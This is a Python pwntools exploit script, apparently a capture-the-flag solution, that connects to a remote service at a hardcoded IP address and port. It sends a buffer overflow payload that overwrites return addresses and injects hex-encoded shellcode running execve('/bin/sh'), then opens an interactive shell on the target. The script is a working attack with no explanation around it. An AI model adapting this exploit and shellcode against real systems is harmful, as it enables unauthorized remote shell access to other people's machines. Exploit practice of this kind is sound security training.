from pwn import *
#e = ELF('./q4')
#p = process('./q4',stdin=PTY)
p = remote('68.183.158.95',8992)
payload = "A"*16
payload += p64(0x600000+0x10) # rwxp
payload += p64(0x4000c7) # main+8
payload += "A"*(160-len(payload))
#payload += "AAAAAAAA"*5
payload += p64(0x600030)*4
payload += "A"*8*2
payload += "4831f648c7c74400600048c7c03b000000990f05".decode('hex') #shellcode
'''
xor rsi,rsi
mov rdi,0x600044
mov rax, 59
cdq
syscall
'''
payload += "/bin/sh\x00" #shell
p.sendline(payload)
p.recv(10000)
p.recv(10000,timeout=1)
p.interactive()
